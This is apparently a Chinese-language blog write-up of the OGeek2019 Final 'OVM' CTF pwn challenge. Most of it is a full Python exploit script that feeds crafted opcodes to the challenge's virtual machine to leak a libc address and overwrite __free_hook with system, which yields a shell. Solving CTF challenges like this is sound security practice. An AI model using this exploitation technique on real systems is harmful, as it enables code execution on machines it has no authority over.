# OGeek2019-Final-OVM



### 解题思路

一道很有趣的虚拟机的题目，抽象实现了一套寄存器、代码段、数据段。解题思路如下：

- 利用一系列操作，将一个`libc`的地址放置在寄存器中
- 打印寄存器，即可得到`libc`地址
- 再利用寄存器写内存操作，将`__free_hook`写为`system`，释放`/bin/sh`块即可

<!-- more -->

### exp

`exp`中都写得很详细了

```python
#! python3
# gengerate gdb-script
gdb_script_content = \
"""def show_info
x /24wx $rebase(0x202040)
x /24wx $rebase(0x242060)
telescope $rebase(0x202040)
telescope &__free_hook
end
"""
with open("./script", mode='w', encoding='utf-8') as f:
    f.writelines(gdb_script_content)


from pwncli import *
from functools import partial

cli_script()

sh = gift['io']

if gift['debug']:
    libc = sh.elf.libc
else:
    libc = ELF('/root/LibcSearcher/libc-database/other_libc_so/libc-2.23.so')


def generate_mem(three:int, two:int, one:int, operation:int) -> int:
    assert operation >= 0 and operation < 0x100
    assert three >= 0 and three < 0x10
    assert two >= 0 and two < 0x10
    assert one >= 0 and one < 0x10
    return ((operation << 24) | (three << 16) | (two << 8) | (one))

op_assign = partial(generate_mem, operation=0x10)
op_bool = partial(generate_mem, operation=0x20)
op_mem2reg = partial(generate_mem, operation=0x30)
op_reg2mem = partial(generate_mem, operation=0x40)
op_reg2stack = partial(generate_mem, operation=0x50)
op_stack2reg = partial(generate_mem, operation=0x60)
op_add = partial(generate_mem, operation=0x70)
op_minus = partial(generate_mem, operation=0x80)
op_and = partial(generate_mem, operation=0x90)
op_or = partial(generate_mem, operation=0xa0)
op_xor = partial(generate_mem, operation=0xb0)
op_lmov = partial(generate_mem, operation=0xc0)
op_rmov = partial(generate_mem, operation=0xd0)
op_exit = partial(generate_mem, operation=0xe0)
op_again = partial(generate_mem, operation=0xf0)
op_show_exit = partial(generate_mem, operation=0xff)

pc = 0
sp = 0

offset = libc.sym['__free_hook'] - libc.sym['read'] - 8

target_offset = 0xf0000000 | offset

codes = [
    0x0f000000,             # helper var
    0xf0000000,             # helper var
    0xf0ffffd0,             # codes[0] | codes[2] = -48 ---> read@got
    0xf0fffff8,             # codes[0] | codes[3] = -8  ---> comment[0]
    target_offset,          # codes[4] - codes[1] = offset
                            # 0 ---> r0
    op_bool(1, 0, 0),       # 1 ---> r1
    op_add(2, 1, 1),        # 2 ---> r2
    op_add(3, 2, 1),        # 3 ---> r3
    op_add(4, 2, 2),        # 4 ---> r4
    op_mem2reg(5, 1, 0),    # mem[0] ---> r5 0x0f000000
    op_mem2reg(6, 1, 1),    # mem[1] ---> r6 0xf0000000
    op_mem2reg(7, 1, 2),    # mem[2] ---> r7 0xf0ffffd0
    op_mem2reg(8, 1, 3),    # mem[3] ---> r8 0xf0fffff8
    op_mem2reg(9, 1, 4),    # mem[4] ---> r9 target_offset
    op_minus(9, 9, 6),      # target_offset - 0xf0000000 = offset ---> r9
    op_or(7, 7, 5),         # r7 | r5 =  0xf0ffffd0 | 0x0f000000 = -48 ---> r7
    op_or(8, 8, 5),         # r8 | r5 =  0xf0fffff8 | 0x0f000000 = -8 ---> r8
    op_mem2reg(10, 0, 7),   # (read_addr & 0xfffff) ---> r10
    op_add(10, 10, 9),      # r10 + r9 = (read_addr & 0xfffff) + offset = (__free_hook_addr & 0xffffffff) ---> r10
    op_reg2mem(10, 0, 8),   # (__free_hook_addr & 0xffffffff) ---> comment[1]
    op_minus(7, 7, 1),      # -49 ---> r7
    op_add(8, 8, 1),        # -7 ---> r8
    op_mem2reg(11, 0, 7),   # (read_addr << 32) & 0xffffffff ---> r11
    op_reg2mem(11, 0, 8),   # (read_addr << 32) & 0xffffffff ---> comment[0]
    op_reg2mem(7, 0, 15),   # 0xffffffd0 ---> mem[pc]
    op_show_exit(0, 0, 0)
]

code_size = len(codes)

sh.sendlineafter("PC: ", str(pc))
sh.sendlineafter("SP: ", str(sp))
sh.sendlineafter("CODE SIZE: ", str(code_size))
sh.recvuntil("CODE: ")

for i in codes:
    sh.sendline(str(i))

sh.recvuntil("R10: ")
msg = sh.recvline()
lower_addr = int16(msg[:-1].decode())

sh.recvuntil("R11: ")
msg = sh.recvline()
higher_addr = int16(msg[:-1].decode())

free_hook_addr = (higher_addr << 32) + lower_addr + 8
libc.address = free_hook_addr - libc.sym['__free_hook']

log_address("free_hook_addr", free_hook_addr)
log_address("libc_base_addr", libc.address)

sh.sendafter("y", flat("/bin/sh\x00", libc.sym['system']))

sh.interactive()
```



泄露地址:

![image-20210718135314236](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210718135314236.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-07-18-ogeek2019-final-ovm/  

